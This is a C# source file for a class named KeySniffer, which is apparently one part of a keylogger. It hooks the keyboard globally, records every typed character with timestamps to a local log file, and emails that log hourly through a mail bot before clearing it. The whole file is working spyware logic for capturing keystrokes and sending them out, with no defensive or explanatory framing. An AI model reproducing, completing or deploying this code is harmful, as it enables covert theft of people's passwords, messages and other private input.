using System;
using System.IO;
using System.Threading;

namespace SnifferKey
{
    class KeySniffer
    {
        private readonly InterpreterKeys interpreterKeys;
        private readonly MailBot mailBot;
        private readonly FileInfo keyLogInfo;
        private readonly Logger keyLogger;

        public KeySniffer(MailBot mailBot, int bufferSize = 512)
        {
            string pathDirLog = Path.Combine(
                   Environment.CurrentDirectory,
                   "Log");
            Directory.CreateDirectory(pathDirLog);
            string pathLogFile = Path.Combine(pathDirLog, "KeyLog.txt");

            this.keyLogger = new Logger(pathLogFile, bufferSize);
            this.keyLogInfo = new FileInfo(pathLogFile);
            this.interpreterKeys = new InterpreterKeys();

            this.mailBot = mailBot;
        }

        public void Start(int periodSecond = 3600)
        {
            HookerKeys hookerKey = new HookerKeys(ActionResult);
            hookerKey.SetHook();

            int periodMillisecond = periodSecond * 1000;

            Timer timer = new Timer(sendMail, null, periodMillisecond, periodMillisecond);

            if (keyLogInfo.Length != 0)
                timer.Change(0, periodMillisecond);
        }

        private void sendMail(object state)
        {
            if (keyLogInfo.Length != 0)
            {
                mailBot.SendFile(keyLogInfo.FullName);
                keyLogger.ClearLogFile();
            }
        }

        bool ActionResult(DataKey dataKey)
        {
            int scanCode = dataKey.ScanCode;
            if (scanCode == 0 || scanCode == 57 ||
                scanCode > 1 && scanCode < 14 ||
                scanCode > 15 && scanCode < 28 ||
                scanCode > 29 && scanCode < 41 ||
                scanCode > 42 && scanCode < 54)
            {
                char symbols = interpreterKeys.InterpretAsciiEx(dataKey);

                keyLogger.WriteBuffer(symbols);
            }
            if (scanCode == 28 || scanCode == 15 || scanCode == 64)
            {
                keyLogger.WriteBuffer(Environment.NewLine);
                keyLogger.WriteBuffer(DateTime.Now.ToString());
                keyLogger.WriteBuffer(Environment.NewLine);
            }
            return true;
        }
    }
}
